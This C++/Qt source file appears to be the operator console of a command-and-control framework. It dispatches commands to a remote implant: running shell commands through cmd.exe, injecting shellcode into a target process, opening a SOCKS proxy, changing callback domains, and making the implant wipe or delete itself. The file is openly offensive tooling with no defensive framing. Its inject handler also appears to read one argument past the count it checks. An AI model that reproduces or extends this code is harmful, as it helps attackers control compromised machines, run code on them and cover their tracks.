#include "Include/command/command.h"
#include "global.hpp"
#include <QFile>
#include <iostream>
#include <functional>
#define SEND(f) \
    if (!Send)   \
        f;      \
    return true;

#define CONSOLE_INFO(x) \
    TabInteract->TaskInfo(Send, TaskID, x);

#define CONSOLE_ERROR( x )                          \
    TabInteract->TaskError( x );


QMap<QString, QString> CommandInputList;

command::command()
{
    this->Execute.CommandsInstance = this;

}



static auto JoinAtIndex(QStringList list, int index) -> QString
{
    QString string;

    int size = list.size();
    for (int i = 0; i < (size - index); i++)
    {
        if (i == 0)
            string.append(list[index + i]);
        else
            string.append(" " + list[index + i]);
    }

    return string;
}




constexpr size_t customHash(const char* str, size_t hash = 0) {
    return *str ? customHash(str + 1, (hash * 31) + static_cast<size_t>(*str)) : hash;
}
bool command::DispatchCommand(bool Send, QString TaskID, const QString &commandline) {
    qDebug("DispatchCommand");

    if (commandline.size() < 1) {
        return false;
    }

    auto InputCommands = commandline.split(" ");
    if (InputCommands.size() < 1) {
        return false;
    }

    QString command = InputCommands[0];
    switch (customHash(command.toStdString().c_str())) {

        case customHash("help"):
             return DispatchHelpCommand(Send, TaskID, commandline, InputCommands);
        case customHash("shell"):
            return DispatchShellCommand(Send, TaskID, commandline, InputCommands);
        case customHash("sleep"):
            return DispatchSleepCommand(Send, TaskID, commandline, InputCommands);
        case customHash("inject"):
            return DispatchInjectCommand(Send, TaskID, commandline, InputCommands);
        case customHash("proxystart"):
            return DispatchProxyStartCommand(Send, TaskID, commandline, InputCommands);
        case customHash("proxystop"):
            return DispatchProxyStopCommand(Send, TaskID, commandline, InputCommands);
        case customHash("adddomain"):
            return DispatchAddDomainCommand(Send, TaskID, commandline, InputCommands);
        case customHash("deldomain"):
            return DispatchDeleteDomainCommand(Send, TaskID, commandline, InputCommands);
        case customHash("listdomain"):
            return DispatchListDomainCommand(Send, TaskID, commandline, InputCommands);
        case customHash("kill"):
            return DispatchSelfKillCommand(Send, TaskID, commandline, InputCommands);
    case customHash("wipe"):
        return DispatchWipeCommand(Send, TaskID, commandline, InputCommands);
    case customHash("selfdel"):
        return DispatchSelfDelCommand(Send, TaskID, commandline, InputCommands);
    case customHash("tasklist"):
        return DispatchTaskListCommand(Send, TaskID, commandline, InputCommands);
    case customHash("taskdel"):
        return DispatchTaskDelCommand(Send, TaskID, commandline, InputCommands);
    case customHash("tasksclean"):
        return DispatchTasksCleanCommand(Send, TaskID, commandline, InputCommands);
    case customHash("clear"):
        return DispatchClearCommand(Send, TaskID, commandline, InputCommands);

        default:
            CONSOLE_INFO("command not found!");
            return false;
    }
}



bool command::DispatchShellCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {
    if (InputCommands.size() < 2) {
        CONSOLE_ERROR("Not enough arguments enter [help shell] for more info");
        return false;
    }

    QString Args = QString(R"(c:\windows\system32\cmd.exe /c )" + JoinAtIndex(InputCommands, 1)).toUtf8().toBase64();
    qDebug("CONSOLE_INFO");
    TaskID = CONSOLE_INFO("Tasked Agent to execute a shell command");
    qDebug("Execute.ProcModule");


    SEND(Execute.ProcModule(TaskID, 4, Args));
    return true;
}

bool command::DispatchSleepCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {
    if (InputCommands.size() < 3) {
        CONSOLE_ERROR("Not enough arguments enter [help sleep] for more info");
        return false;
    }


    if (InputCommands[1].at(0) == '-') {
        CONSOLE_ERROR("\"sleep\" doesn't support negative delays");
        return false;
    }

    QString jit = "0";

    if (InputCommands.size() == 3) {
        jit = InputCommands[2];
        bool ok;
        double jitter = jit.toDouble(&ok);

        if (!ok) {
            CONSOLE_ERROR("Invalid jitter");
            return false;
        }

        if (jitter < 0) {
            CONSOLE_ERROR("\"sleep\" doesn't support negative jitters");
            return false;
        }

        if (jitter > 100) {
            CONSOLE_ERROR("The jitter can't be larger than 100");
            return false;
        }

        TaskID = CONSOLE_INFO("Tasked to sleep for " + InputCommands[1] + " seconds with " + jit + "% jitter");
    } else {
        TaskID = CONSOLE_INFO("Tasked to sleep for " + InputCommands[1] + " seconds");
    }



    QString Args = (InputCommands[1] + ";" + jit).toUtf8().toBase64();
    SEND(Execute.Sleep(TaskID, Args));
    return true;
}

bool command::DispatchInjectCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {
    TaskID = CONSOLE_INFO("Tasked demon to inject shellcode into a remote process");

    if (InputCommands.size() >= 3) {
        auto TargetPID = InputCommands[2];
        auto Shellcode = QString((InputCommands.begin() + 3)->toStdString().c_str());

        if (!QFile::exists(Shellcode)) {
            CONSOLE_ERROR("Specified file not found");
            return false;
        }





        SEND(Execute.ShellcodeInject(TaskID, TargetPID, Shellcode));

    } else {
        CONSOLE_ERROR("Not enough arguments");
        return false;
    }
    return true;
}



bool command::DispatchProxyStartCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

    TaskID = CONSOLE_INFO( "Tasked Agent to start socks proxy" );

           if ( InputCommands.size() >= 4 )
           {
               auto CallBackHost = InputCommands[ 1 ];
               auto AgentConnectPort  = InputCommands[ 2 ];
               auto ProxyListenerPort  = InputCommands[ 3 ];

               SEND( Execute.ProxyStart( TaskID, CallBackHost, AgentConnectPort, ProxyListenerPort ) );
           }
           else
           {
               CONSOLE_ERROR( "Not enough arguments" )
               return false;
           }

           return true;
}


bool command::DispatchProxyStopCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {


    TaskID = CONSOLE_INFO( "Tasked Agent to stop socks proxy" );

            if ( InputCommands.size() >= 4 )
            {
                auto CallBackHost = InputCommands[ 1 ];
                auto AgentConnectPort  = InputCommands[ 2 ];
                auto ProxyListenerPort  = InputCommands[ 3 ];


                SEND( Execute.ProxyStop( TaskID, CallBackHost, AgentConnectPort, ProxyListenerPort ) );
            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
            return true;
}




bool command::DispatchAddDomainCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

    TaskID = CONSOLE_INFO( "Tasked Agent to add new call back domain" );

            if ( InputCommands.size() >= 2 )
            {
                auto DomainName = InputCommands[ 1 ];


                SEND( Execute.AddCallBackDomain( TaskID, DomainName ) );
            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
            return true;
}



bool command::DispatchDeleteDomainCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

            TaskID = CONSOLE_INFO( "Tasked Agent to delete call back domain" );

            if ( InputCommands.size() >= 2 )
            {
                auto DomainName = InputCommands[ 1 ];


                SEND( Execute.DeleteCallBackDomain( TaskID, DomainName ) );
            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
            return true;

}
bool command::DispatchListDomainCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

            TaskID = CONSOLE_INFO( "Tasked Agent to list call back domain" );

            if ( InputCommands.size() >= 1 )
            {



                SEND( Execute.ListCallBackDomain( TaskID ) );
            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
            return true;

}

bool command::DispatchSelfKillCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

            TaskID = CONSOLE_INFO( "Tasked Agent to self kill" );

            if ( InputCommands.size() >= 2 )
            {

                auto Confirm = InputCommands[ 1 ];
                if(Confirm=="yes"){
                    SEND( Execute.SelfKill( TaskID ) );
                }else{
                    CONSOLE_ERROR( "confirm kill by enter [kill yes]" )

                }

            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
            return true;

}

bool command::DispatchWipeCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

            TaskID = CONSOLE_INFO( "Tasked Agent to self wipe" );

            if ( InputCommands.size() >= 2 )
            {

                auto Confirm = InputCommands[ 1 ];
                if(Confirm=="yes"){
                    SEND( Execute.SelfWipe( TaskID ) );
                }else{
                    CONSOLE_ERROR( "confirm kill by enter [wipe yes]" )

                }

            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
            return true;

}


bool command::DispatchSelfDelCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

            TaskID = CONSOLE_INFO( "Tasked Agent to self delete" );

            if ( InputCommands.size() >= 2 )
            {

                auto Confirm = InputCommands[ 1 ];
                if(Confirm=="yes"){
                    SEND( Execute.SelfDel( TaskID ) );
                }else{
                    CONSOLE_ERROR( "confirm self delete by enter [selfdel yes]" )

                }

            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
            return true;

}

bool command::DispatchTaskListCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

            TaskID = CONSOLE_INFO( "Tasked Agent to list tasks" );

            if ( InputCommands.size() >= 1 )
            {

                SEND( Execute.TaskList( TaskID ) );
            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
            return true;

}

bool command::DispatchTasksCleanCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

            TaskID = CONSOLE_INFO( "Tasked Agent to Clean tasks" );
            if ( InputCommands.size() >= 2 )
            {

            auto Confirm = InputCommands[ 1 ];
            if(Confirm=="yes"){
                SEND( Execute.TasksClean(TaskID ) );
            }else
            {
                CONSOLE_ERROR( "confirm tasks clean by enter [tasksclean yes]" )

                return false;
            }
            }else{
                CONSOLE_ERROR( "Not enough arguments" )

            }

            return true;

}


bool command::DispatchTaskDelCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

            TaskID = CONSOLE_INFO( "Tasked Agent to Del task " );
            if ( InputCommands.size() >= 2 )
            {
                auto DelTaskID = InputCommands[ 1 ];
                SEND( Execute.TaskDel(TaskID,DelTaskID ) );

            }else{
                CONSOLE_ERROR( "confirm tasks clean by enter [tasksclean yes]" )

            }
            return true;

}




bool command::DispatchHelpCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {
    if (InputCommands.size() >= 1) {
        TaskID = CONSOLE_INFO("help");

        // Check if specific command help is requested
        if (InputCommands.size() == 2) {
            QString requestedCommand = InputCommands[1];
            // Search for the requested command in CommandList
            for (const auto &cmd : CommandList) {
                if (cmd.CommandString == requestedCommand) {
                    // Print the help information for the requested command

                    TabInteract->ConsoleAppend("--------------------------------------------------------------------------------------------------------------------------------");
                    TabInteract->ConsoleAppend("| " + cmd.CommandString + QString(27 - cmd.CommandString.length(), ' ') + "|                                                                                                 |");
                    TabInteract->ConsoleAppend("|                            | " + cmd.Description + QString(96 - cmd.Description.length(), ' ') + "|");
                    TabInteract->ConsoleAppend("|                            |  Usage: " + cmd.Usage + QString(88 - cmd.Usage.length(), ' ') + "|");
                    TabInteract->ConsoleAppend("|                            |  Example: " + cmd.Example + QString(86 - cmd.Example.length(), ' ') + "|");
                    TabInteract->ConsoleAppend("--------------------------------------------------------------------------------------------------------------------------------");
                    return true;
                }
            }
            // If command help not found
            CONSOLE_ERROR("Command help not found");
        } else {
            // Print all command help in table format
            TabInteract->ConsoleAppend("--------------------------------------------------------------------------------------------------------------------------------");
            for (const auto &cmd : CommandList) {
                TabInteract->ConsoleAppend("| " + cmd.CommandString + QString(27 - cmd.CommandString.length(), ' ') + "|                                                                                                 |") ;
                TabInteract->ConsoleAppend("|                            | " + cmd.Description + QString(96 - cmd.Description.length(), ' ') + "|");
                TabInteract->ConsoleAppend("--------------------------------------------------------------------------------------------------------------------------------");
            }
        }
    } else {
        CONSOLE_ERROR("Not enough arguments");
        return false;
    }
    return true;
}


bool command::DispatchClearCommand(bool Send, QString TaskID, const QString &commandline, const QStringList &InputCommands) {

            TabInteract->Clear();

            return true;

}


